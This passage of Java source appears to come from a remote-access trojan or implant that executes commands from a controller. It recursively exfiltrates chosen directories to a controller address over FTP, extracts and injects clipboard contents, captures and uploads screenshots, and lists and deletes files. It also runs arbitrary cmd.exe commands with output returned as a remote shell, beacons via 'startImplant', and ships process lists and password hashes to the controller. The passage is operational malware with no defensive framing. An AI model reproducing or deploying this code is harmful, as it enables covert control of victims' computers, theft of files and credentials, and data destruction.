          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "Invalid file received. \"" + fleToCat + "\" does not exist.  Unable to cat file...", false, false);
          return true;
        }

        if (!fleToCat.isFile())
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "Invalid command received. \"" + fleToCat + "\" is not a file.  Only attempt to cat files...", false, false);
          return true;
        }

        sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "Executing command \"" + "cat " + fleToCat.getCanonicalPath() + "\"", false, false);
        catFile(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE", fleToCat);

        return true;
      }

      if (cmd[1].trim().equalsIgnoreCase("ORBIT_DIRECTORY"))
      {
        String directoryPath = cmd[2].trim();
        String exfiltrationFileType = cmd[3].trim();
        String enableRecursiveDirectoryTraversal = cmd[4].trim();
        String delayMillis = cmd[5].trim();
        String addressToController = cmd[6].trim();
        String portToController = cmd[7].trim();

        boolean recursiveDirectoryTraversal = false;
        int wakeAndScanDelayInterval = 1000;
        int port = 21;
        File fleDirectoryToOrbit = null;

        if (enableRecursiveDirectoryTraversal.trim().equalsIgnoreCase("true"))
        {
          recursiveDirectoryTraversal = true;
        }

        try
        {
          wakeAndScanDelayInterval = Integer.parseInt(delayMillis);
        }
        catch (Exception ee)
        {
          Driver.sop("Invalid Input Line Specified for timing interval!  Defaulting to 1000 secs");
          wakeAndScanDelayInterval = 1000;
        }

        try
        {
          port = Integer.parseInt(portToController);
        }
        catch (Exception e)
        {
          sendToController("Invalid Port received: " + port + " Unable to begin directory extraction", false, false);
          return true;
        }

        try
        {
          fleDirectoryToOrbit = new File(directoryPath.trim());

          if ((fleDirectoryToOrbit == null) || (!fleDirectoryToOrbit.exists()))
          {
            throw new FileNotFoundException("File not found!");
          }
        }
        catch (FileNotFoundException eee)
        {
          sendToController("Invalid orbit directory specified: " + directoryPath + " Unable to begin directory extraction", false, false);
          return true;
        }

        sendToController("Initiating Directory Orbit. Parameters: " + directoryPath + Driver.fileSeperator + exfiltrationFileType + " recursive exfiltration: " + recursiveDirectoryTraversal + " " + " Timing delay: " + wakeAndScanDelayInterval / 1000 + "secs  Address To Controller: " + addressToController + ":" + portToController, false, false);

        Directory_Orbiter directoryOrbiter = new Directory_Orbiter(fleDirectoryToOrbit, exfiltrationFileType, recursiveDirectoryTraversal, wakeAndScanDelayInterval, addressToController, port, this);
        directoryOrbiter.start();
      }
      String directoryPath;
      String exfiltrationFileType;
      if (cmd[1].trim().equalsIgnoreCase("EXFIL_DIRECTORY"))
      {
        directoryPath = cmd[2].trim();
        exfiltrationFileType = cmd[3].trim();
        String enableRecursiveDirectoryTraversal = cmd[4].trim();
        String addressToController = cmd[5].trim();
        String portToController = cmd[6].trim();

        boolean recursiveDirectoryTraversal = false;

        int port = 21;
        File fleDirectoryToOrbit = null;

        if (enableRecursiveDirectoryTraversal.trim().equalsIgnoreCase("true"))
        {
          recursiveDirectoryTraversal = true;
        }

        try
        {
          port = Integer.parseInt(portToController);
        }
        catch (Exception e)
        {
          sendToController("Invalid Port received: " + port + " Unable to begin directory extraction", false, false);
          return true;
        }

        try
        {
          fleDirectoryToOrbit = new File(directoryPath.trim());

          if ((fleDirectoryToOrbit == null) || (!fleDirectoryToOrbit.exists()))
          {
            throw new FileNotFoundException("File not found!");
          }
        }
        catch (FileNotFoundException eee)
        {
          sendToController("Invalid orbit directory specified: " + directoryPath + " Unable to begin directory extraction", false, false);
          return true;
        }

        sendToController("Initiating Directory Extraction. Parameters: " + directoryPath + Driver.fileSeperator + exfiltrationFileType + " recursive exfiltration: " + recursiveDirectoryTraversal + " Address To Controller: " + addressToController + ":" + portToController, false, false);

        Directory_Orbiter directoryOrbiter = new Directory_Orbiter(fleDirectoryToOrbit, exfiltrationFileType, recursiveDirectoryTraversal, -2, addressToController, port, this);
        directoryOrbiter.start();
      }

      if (cmd[1].trim().equalsIgnoreCase("EXTRACT_CLIPBOARD"))
      {
        ClipboardPayload.copyClipboard(this);
      }

      if (cmd[1].trim().equalsIgnoreCase("INJECT_CLIPBOARD"))
      {
        ClipboardPayload.injectClipboard(this, cmd[2]);
      }

      if (cmd[1].trim().equalsIgnoreCase("SET_WALL_PAPER"))
      {
        setWallPaper(cmd[2]);
      }

      if (cmd[1].trim().equalsIgnoreCase("[RELAY_NOTIFICATION_YOU_ARE_CONNECTED_TO_RELAY]"))
      {
        this.i_am_connected_to_relay = true;
        Driver.sop("FYI: I am connected to a Relay System!!!");
      }

      /*******************************************************
		 * CLIPBOARD EXTRACTOR
		 *******************************************************/
		if(cmd[1].trim().equalsIgnoreCase(Driver.ENABLE_CLIPBOARD_EXTRACTOR))
		{
			Worker_Thread_Payloads worker = new Worker_Thread_Payloads(Driver.CLIPBOARD_INTERRUPT_INTERVAL_MILLIS, this, Worker_Thread_Payloads.PAYLOAD_CLIPBOARD_EXTRACTION,"", null, 0, null);
		}
		
		/*******************************************************
		 * CLIPBOARD INJECTOR
		 *******************************************************/
		if(cmd[1].trim().equalsIgnoreCase(Driver.ENABLE_CLIPBOARD_INJECTOR))
		{
			String injectionText = "";
			
			if(cmd.length < 2 || cmd[2] == null)
				injectionText = "";
			else
				injectionText = cmd[2];
			
			Worker_Thread_Payloads worker = new Worker_Thread_Payloads(Driver.CLIPBOARD_INTERRUPT_INTERVAL_MILLIS, this, Worker_Thread_Payloads.PAYLOAD_CLIPBOARD_INJECTION, injectionText, null, 0, null);
		}

      if (cmd[1].trim().equalsIgnoreCase("DISABLE CLIPBOARD EXTRACTOR"))
      {
        Worker_Thread_Payloads.TERMINATE_ALL_WORKERS_CLIPBOARD = true;
      }

      if (cmd[1].trim().equalsIgnoreCase("DISABLE CLIPBOARD INJECTOR"))
      {
        Worker_Thread_Payloads.TERMINATE_ALL_WORKERS_CLIPBOARD = true;
      }

      if (cmd[1].trim().equalsIgnoreCase("SCRAPE SCREEN"))
      {
        Worker_Thread_Payloads worker = new Worker_Thread_Payloads(200, this, 2, "", cmd[3], Integer.parseInt(cmd[4]), null);

        return true;
      }

      if (cmd[1].trim().equalsIgnoreCase("DISABLE RECORD SCREEN"))
      {
        Worker_Thread_Payloads.TERMINATE_ALL_WORKERS_RECORD_SCREEN = true;
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.sop("Unknown Command received: " + cmdLine);
    }

    return false;
  }

  public boolean setWallPaper(String pathOfImage)
  {
    try
    {
      if ((pathOfImage == null) || (pathOfImage.trim().equals("")))
      {
        sendToController("ERROR!  invalid wallpaper image path received!", false, false);
        return true;
      }

      File fleImage = new File(pathOfImage.trim());

      if ((!fleImage.exists()) || (!fleImage.isFile()))
      {
        sendToController("ERROR!  invalid wallpaper image path \"" + pathOfImage.trim() + "\"" + " received! Image File does not exist", false, false);
        return true;
      }

      if ((fleImage.getCanonicalPath().endsWith(".jpg")) || (fleImage.getCanonicalPath().endsWith(".jpeg")) || (fleImage.getCanonicalPath().endsWith(".bmp")) || (fleImage.getCanonicalPath().endsWith(".bitmap")) || (fleImage.getCanonicalPath().endsWith(".png")))
      {
        System.loadLibrary("user32");
      }
      else
      {
        sendToController("ERROR!  unsupported file extension provided.  unable to continue and set wall background.", false, false);
        return true;
      }

      return true;
    }
    catch (Exception e)
    {
      sendToController("ERROR!  unable to set wallpaper!", false, false);
    }

    return true;
  }

  public boolean catFile(String line_header_ok_to_be_null, File fleToCat)
  {
    try
    {
      String prependToEachLine = "";
      if ((line_header_ok_to_be_null != null) && (!line_header_ok_to_be_null.trim().equals("")))
      {
        prependToEachLine = line_header_ok_to_be_null + "%%%%%";
      }

      String command = "type " + fleToCat.getCanonicalPath();

      Process process = Runtime.getRuntime().exec("cmd.exe /C " + command, null, fleToCat.getParentFile());

      BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
      BufferedReader process_IN_ERROR = new BufferedReader(new InputStreamReader(process.getErrorStream()));

      ProcessHandlerThread process_INPUT = new ProcessHandlerThread(prependToEachLine, command, process, process_IN, this.pwOut);
      ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(prependToEachLine, command, process, process_IN_ERROR, this.pwOut);

      process_INPUT.start();
      process_INPUT_ERROR.start();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("catFile", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean mapFilesUnderDirectory(String directoryToMap)
  {
    try
    {
      sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "Attempting to list files under Directory: " + directoryToMap, false, false);

      this.fsv = FileSystemView.getFileSystemView();

      if ((directoryToMap.trim().equalsIgnoreCase("c:")) || (directoryToMap.trim().equalsIgnoreCase("c:" + Driver.fileSeperator)))
      {
        this.myFileBrowserNewFile = new File(Driver.fileSeperator);
      }
      else if (directoryToMap.trim().endsWith(Driver.fileSeperator))
      {
        this.myFileBrowserNewFile = new File(directoryToMap.trim());
      }
      else
      {
        this.myFileBrowserNewFile = new File(directoryToMap.trim() + Driver.fileSeperator);
      }

      if ((this.myFileBrowserNewFile != null) && (this.myFileBrowserNewFile.exists()) && (!this.myFileBrowserNewFile.isFile()))
      {
        this.myFileBrowserCurrentFile = this.myFileBrowserNewFile;
      }
      else
      {
        if ((this.myFileBrowserCurrentFile == null) || (!this.myFileBrowserCurrentFile.exists()) || (this.myFileBrowserCurrentFile.isFile()))
        {
          this.myFileBrowserCurrentFile = new File(".");
        }

        sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "* * * * ERROR -->> Invalid directory specified. Returning to list: " + this.myFileBrowserCurrentFile.getCanonicalPath(), false, false);
      }

      this.arrFileList = this.myFileBrowserCurrentFile.listFiles();

      if (this.arrFileList == null)
      {
        this.myFileBrowserCurrentFile = new File(Driver.fileSeperator);

        sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "* * * ERROR -->>>> Invalid directory specified. Directory doesn't seem to exist or access was denied... Returning listing of: " + this.myFileBrowserCurrentFile.getCanonicalPath(), false, false);

        this.arrFileList = this.myFileBrowserCurrentFile.listFiles();
      }
      else if (this.arrFileList.length < 1)
      {
        sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "* NOTE -> No [Files] populated under specified directory: " + this.myFileBrowserCurrentFile.getCanonicalPath(), false, false);

        this.myFileBrowserCurrentFile = new File(Driver.fileSeperator);
        this.arrFileList = this.myFileBrowserCurrentFile.listFiles();
      }

      File currFile = null;
      Object_FileBrowser objFile = null;

      sendToController(this.myUniqueDelimiter + "%%%%%" + "BEGIN_FILE_LIST", false, false);

      for (int i = 0; i < this.arrFileList.length; i++)
      {
        currFile = this.arrFileList[i];

        objFile = new Object_FileBrowser(this.fsv.isDrive(currFile), currFile, this.fsv.getSystemDisplayName(currFile), this.fsv.isFileSystem(currFile), this.fsv.isFloppyDrive(currFile), currFile.isDirectory(), currFile.isFile(), currFile.isHidden(), this.fsv.isTraversable(currFile), currFile.canRead(), currFile.canWrite(), currFile.canExecute(), currFile.getCanonicalPath(), currFile.getParentFile(), currFile.lastModified(), currFile.getTotalSpace(), currFile.getUsableSpace(), currFile.length());

        sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_LIST" + "%%%%%" + objFile.getFileObjectData_Socket("#####"), false, false);
      }

      sendToController(this.myUniqueDelimiter + "%%%%%" + "END_FILE_LIST", false, false);

      return true;
    }
    catch (Exception e)
    {
      sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "**** ERROR: UNABLE TO LOAD FILE ROOTS UNDER SPECIFIED DIRECTORY", false, false);
    }

    return false;
  }

  public boolean deleteFile(File fileToDelete)
  {
    try
    {
      if (!fileToDelete.exists())
      {
        Driver.sop("Deletion for \"" + fileToDelete + "\" received. File does not exist. Deletion failure. Returning false.");
        return true;
      }

      if (fileToDelete.isFile())
      {
        return fileToDelete.delete();
      }

      if (fileToDelete.isDirectory())
      {
        File[] arrFilesToDelete = fileToDelete.listFiles();

        File fleDel = null;

        for (int i = 0; (arrFilesToDelete != null) && (i < arrFilesToDelete.length); i++)
        {
          try
          {
            String fileName = "";
            fleDel = arrFilesToDelete[i];

            if (!fleDel.exists())
            {
              sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "--> Deletion for file \"" + fleDel + "\" failed. File no longer exists!", false, false);
            }
            else
            {
              deleteFile(fleDel);

              fileName = fleDel.getCanonicalPath();

              if (fleDel.exists())
              {
                if (fleDel.delete())
                {
                  sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "--> \"" + fileName + "\" deleted.", false, false);
                }
                else
                {
                  sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "--> Deletion for file\"" + fileName + "\" failed! Perhaps access was denied...", false, false);
                }
              }
            }
          }
          catch (Exception localException1)
          {
          }
        }
        if (!fileToDelete.exists())
        {
          return true;
        }

        String directoryName = fileToDelete.getCanonicalPath();

        if (fileToDelete.delete())
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "--> \"" + directoryName + "\" directory has been successfully deleted.", false, false);
        }
        else
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "--> Deletion for directory\"" + directoryName + "\" failed! Perhaps access was denied...", false, false);
        }

      }
      else
      {
        Driver.sop("HMM... UNKNOWN, contact Solo and check on this one in " + strMyClassName);
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("deleteFile", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean sendScreenCaptures(String[] cmd, String screenImgSavePath, String fileNameWithoutExtension)
  {
    try
    {
      ArrayList alToSend = CaptureScreen.captureScreens(screenImgSavePath, fileNameWithoutExtension);

      if ((alToSend == null) || (alToSend.size() < 1))
      {
        return false;
      }

      IncrementObject statusIncrement = null;
      try { statusIncrement = new IncrementObject(100.0D / alToSend.size()); } catch (Exception e) { statusIncrement = null; }

      for (int i = 0; i < alToSend.size(); i++)
      {
        if ((alToSend.get(i) == null) || (!((File)alToSend.get(i)).exists()) || (!((File)alToSend.get(i)).isFile()) || (alToSend.size() < 1))
        {
          Driver.sop("Empty file received at index " + i + "... skipping this result");
        }
        else
        {
          FTP_Thread_Sender[] arrFTP_Sender = new FTP_Thread_Sender[alToSend.size()];
          arrFTP_Sender[i] = new FTP_Thread_Sender(true, false, cmd[3], Integer.parseInt(cmd[4]), 4096, (File)alToSend.get(i), this.pwOut, true, FTP_ServerSocket.FILE_TYPE_SCREEN_CAPTURES, statusIncrement);
          arrFTP_Sender[i].start();
        }
      }
      return true;
    }
    catch (Exception e)
    {
      Driver.eop("sendScreenCaptures", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean sendFile(String[] command)
  {
    try
    {
      FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, command[2], Integer.parseInt(command[3]), 4096, new File(command[4]), this.pwOut, false, FTP_ServerSocket.FILE_TYPE_ORDINARY, null);
      FTP_Sender.start();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("sendFile", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return true;
  }

  public boolean omitCommand(String cmd)
  {
    try
    {
      if (cmd == null)
      {
        return false;
      }

      if (cmd.trim().toUpperCase().startsWith(Driver.CHAT_MESSAGE_BROADCAST.trim().toUpperCase()))
      {
        Driver.sop("\n * * SPECIAL NOTE: ommitting executing command CHAT MESSAGE * * ");
        return true;
      }

    }
    catch (Exception e)
    {
      Driver.eop("omitCommand", strMyClassName, e, "", false);
    }

    return false;
  }

  public boolean executeCommand(String command)
  {
    try
    {
      if (omitCommand(command))
      {
        return true;
      }

      boolean skipReadingOutputStreams = false;
      if ((command != null) && (command.startsWith("&")))
      {
        skipReadingOutputStreams = true;

        command = command.substring("&".length());

        String result = "";

        if (skipReadingOutputStreams)
        {
          result = ">> command executed. output omitted";

          this.process = Runtime.getRuntime().exec("cmd.exe /C " + command, null, Driver.fleCurrentWorkingDirectory);

          this.process_IN = new BufferedReader(new InputStreamReader(this.process.getInputStream()));
          this.process_IN_ERROR = new BufferedReader(new InputStreamReader(this.process.getErrorStream()));

          ProcessHandlerThread process_INPUT = new ProcessHandlerThread(command, this.process, this.process_IN, null);
          ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(command, this.process, this.process_IN_ERROR, null);

          process_INPUT.start();
          process_INPUT_ERROR.start();
        }

        this.pwOut.println(result);
        this.pwOut.flush();
        executeCommand(" ");

        System.gc();

        return true;
      }

      if ((command != null) && (command.trim().equals("")))
      {
        this.process = Runtime.getRuntime().exec("cmd /c cd ", null, Driver.fleCurrentWorkingDirectory);

        this.process_IN = new BufferedReader(new InputStreamReader(this.process.getInputStream()));
        this.process_OUT = new PrintWriter(new OutputStreamWriter(this.process.getOutputStream()));

        String cmdLine = "";
        while ((cmdLine = this.process_IN.readLine()) != null)
        {
          this.pwOut.println(cmdLine + ">");
          this.pwOut.flush();
        }

      }
      else if (command.trim().toLowerCase().startsWith("start"))
      {
        this.process = Runtime.getRuntime().exec("cmd.exe /C " + command, null, Driver.fleCurrentWorkingDirectory);

        String result = ">> command executed. output omitted";

        if (!skipReadingOutputStreams)
        {
          this.process_IN = new BufferedReader(new InputStreamReader(this.process.getErrorStream()));

          result = this.process_IN.readLine();

          if ((result == null) || (result.trim().equals("")))
          {
            result = "command completed successfully. no errors reported.";
          }

        }

        this.pwOut.println(result);

        this.pwOut.flush();
        executeCommand(" ");

        System.gc();
      }
      else
      {
        if (command.trim().length() == 2)
        {
          File newDrive = new File(command.trim());

          if (command.trim().equalsIgnoreCase("c:"))
          {
            newDrive = new File(Driver.fileSeperator);
          }

          try
          {
            this.process = Runtime.getRuntime().exec("cmd /c cd", null, newDrive);

            this.process_IN = new BufferedReader(new InputStreamReader(this.process.getInputStream()));
            this.process_OUT = new PrintWriter(new OutputStreamWriter(this.process.getOutputStream()));

            String cmdLine = "";
            for (; (cmdLine = this.process_IN.readLine()) != null; 
              this.pwOut.flush()) this.pwOut.println(cmdLine + ">");

            Driver.fleCurrentWorkingDirectory = newDrive;
            Driver.CURRENT_WORKING_DIRECTORY = newDrive.toString();
          }
          catch (Exception ee)
          {
            this.pwOut.println("The system cannot find the drive specified!");
            this.pwOut.println(Driver.fleCurrentWorkingDirectory.getCanonicalFile() + ">");
            this.pwOut.flush();
          }

          return true;
        }

        if ((command != null) && (command.trim().startsWith("cd")))
        {
          try
          {
            File newDirectory = null;

            if ((command.trim().equalsIgnoreCase("cd\\")) || (command.trim().equalsIgnoreCase("cd \\")))
            {
              newDirectory = new File("\\");
            }
            else if (command.trim().equalsIgnoreCase("cd c:"))
            {
              newDirectory = new File(Driver.fileSeperator);
            }
            else
            {
              String normalizedCommand = command.trim();
              normalizedCommand = command.substring(2);
              normalizedCommand = normalizedCommand.trim();

              if ((normalizedCommand.length() == 2) && (!normalizedCommand.startsWith("..")))
              {
                newDirectory = new File(normalizedCommand);
              }
              else if (Driver.fleCurrentWorkingDirectory.toString().endsWith(Driver.fileSeperator)) {
                newDirectory = new File(Driver.fleCurrentWorkingDirectory + normalizedCommand);
              }
              else {
                newDirectory = new File(Driver.fleCurrentWorkingDirectory + Driver.fileSeperator + normalizedCommand);
              }

            }

            this.process = Runtime.getRuntime().exec("cmd /c cd", null, newDirectory);

            this.process_IN = new BufferedReader(new InputStreamReader(this.process.getInputStream()));
            this.process_OUT = new PrintWriter(new OutputStreamWriter(this.process.getOutputStream()));

            String cmdLine = "";
            for (; (cmdLine = this.process_IN.readLine()) != null; 
              this.pwOut.flush()) this.pwOut.println(cmdLine + ">");

            Driver.fleCurrentWorkingDirectory = newDirectory;
            Driver.CURRENT_WORKING_DIRECTORY = newDirectory.getCanonicalPath();
          }
          catch (Exception e)
          {
            this.pwOut.println("The system cannot find the drive specified!");
            this.pwOut.println(Driver.fleCurrentWorkingDirectory.getCanonicalFile() + ">");
            this.pwOut.flush();
          }

        }
        else
        {
          this.process = Runtime.getRuntime().exec("cmd.exe /C " + command, null, Driver.fleCurrentWorkingDirectory);
          this.process_IN = new BufferedReader(new InputStreamReader(this.process.getInputStream()));
          this.process_IN_ERROR = new BufferedReader(new InputStreamReader(this.process.getErrorStream()));

          ProcessHandlerThread process_INPUT = new ProcessHandlerThread(command, this.process, this.process_IN, this.pwOut);
          ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(command, this.process, this.process_IN_ERROR, this.pwOut);

          process_INPUT.start();
          process_INPUT_ERROR.start();

          executeCommand(" ");
        }

      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("executeCommand", strMyClassName, e, e.getLocalizedMessage(), true);
    }

    return false;
  }

  public boolean executeCommand_SaveResultsToFile_AndFTP_Results_To_Controller(String COMMAND, File fleFullPath_including_extension_to_write_command_output, String statusNotification, String FTP_Addr, int FTP_Port, PrintWriter pwSktOut)
  {
    PrintWriter pwFileOut = null;
    try
    {
      if (omitCommand(COMMAND))
      {
        return true;
      }

      pwFileOut = new PrintWriter(new BufferedOutputStream(new FileOutputStream(fleFullPath_including_extension_to_write_command_output.toString())));

      Process process = Runtime.getRuntime().exec(COMMAND);

      BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
      BufferedReader process_IN_ERROR = new BufferedReader(new InputStreamReader(process.getErrorStream()));

      ProcessHandlerThread process_INPUT = new ProcessHandlerThread(COMMAND, process, process_IN, pwFileOut);
      ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(COMMAND, process, process_IN_ERROR, pwFileOut);

      process_INPUT.start();
      process_INPUT_ERROR.start();

      System.gc();

      pwFileOut.flush();
      pwFileOut.close();

      sendToController(statusNotification + " Searching for Controller to FTP results...", false, true);

      FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, FTP_Addr, FTP_Port, 4096, fleFullPath_including_extension_to_write_command_output, pwSktOut, true, FTP_ServerSocket.FILE_TYPE_ORDINARY, null);
      FTP_Sender.start();

      return true;
    }
    catch (Exception e) {
      try {
        pwFileOut.close(); } catch (Exception localException1) {
      }
      Driver.eop("executeCommand_SaveResultsToFile_AndFTP_Results_To_Controller", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean executeCommand(String COMMAND, PrintWriter pwOutSocket)
  {
    try
    {
      if (omitCommand(COMMAND))
      {
        return true;
      }

      Process process = Runtime.getRuntime().exec(COMMAND);

      BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
      BufferedReader process_IN_ERROR = new BufferedReader(new InputStreamReader(process.getErrorStream()));

      ProcessHandlerThread process_INPUT = new ProcessHandlerThread(COMMAND, process, process_IN, pwOutSocket);
      ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(COMMAND, process, process_IN_ERROR, pwOutSocket);

      process_INPUT.start();
      process_INPUT_ERROR.start();

      System.gc();

      pwOutSocket.flush();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("executeCommand taking String COMMAND and PrintWriter pwOutSocket as params", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public void actionPerformed(ActionEvent ae)
  {
    try
    {
      if ((ae.getSource() == this.tmrBeacon) && (this.respondToTimerInterrupt))
      {
        try
        {
          this.tmrBeacon.stop();
        } catch (Exception localException1) {
        }
        this.respondToTimerInterrupt = false;

        startImplant();
      }
      else if ((ae.getSource() == this.tmrRunningProcessList) && (this.processInterrupt_RunningProcessList))
      {
        this.processInterrupt_RunningProcessList = false;

        sendRunningProcessList();

        this.processInterrupt_RunningProcessList = true;
      }

    }
    catch (Exception e)
    {
      Driver.eop("AE", strMyClassName, e, e.getLocalizedMessage(), false);
    }
  }

  public boolean sendRunningProcessList()
  {
    try
    {
      this.proc = Runtime.getRuntime().exec("tasklist /v /fo csv");
      this.brIn_WorkerThread = new BufferedReader(new InputStreamReader(this.proc.getInputStream()));
      this.alRunningProcessList = ProcessHandlerThread.getBufferedArrayList(this.brIn_WorkerThread, true);

      if ((this.alRunningProcessList == null) || (this.alRunningProcessList.size() < 1))
      {
        sendToController("No process data to return!", false, true);
        try
        {
          Driver.sop("Stopping interrupt timer for running process list");
          this.tmrRunningProcessList.stop();
        }
        catch (Exception localException1)
        {
        }
      }

      sendToController(this.myUniqueDelimiter + "%%%%%" + "BEGIN_RUNNING_PS", false, false);

      for (int i = 0; i < this.alRunningProcessList.size(); i++)
      {
        sendToController(this.myUniqueDelimiter + "%%%%%" + "DATA_RUNNING_PS" + "%%%%%" + (String)this.alRunningProcessList.get(i), false, false);
      }

      sendToController(this.myUniqueDelimiter + "%%%%%" + "END_RUNNING_PS", false, false);

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("sendRunningProcessList", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean saveHashes(String COMMAND, File fleFullPath_including_extension_to_write_command_output, String statusNotification, String FTP_Addr, int FTP_Port, PrintWriter pwSktOut)
  {
    try
    {
      Process process = Runtime.getRuntime().exec(COMMAND);

      BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
      BufferedReader process_IN_ERROR = new BufferedReader(new InputStreamReader(process.getErrorStream()));

      ProcessHandlerThread process_INPUT = new ProcessHandlerThread(COMMAND, process, process_IN, pwSktOut);
      ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(COMMAND, process, process_IN_ERROR, pwSktOut);

      process_INPUT.start();
      process_INPUT_ERROR.start();

      System.gc();

      sendToController(statusNotification + " Searching for Controller to FTP results...", false, true);

      FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, FTP_Addr, FTP_Port, 4096, fleFullPath_including_extension_to_write_command_output, pwSktOut, true, FTP_ServerSocket.FILE_TYPE_ORDINARY, null);
      FTP_Sender.start();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("saveHashes", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }
}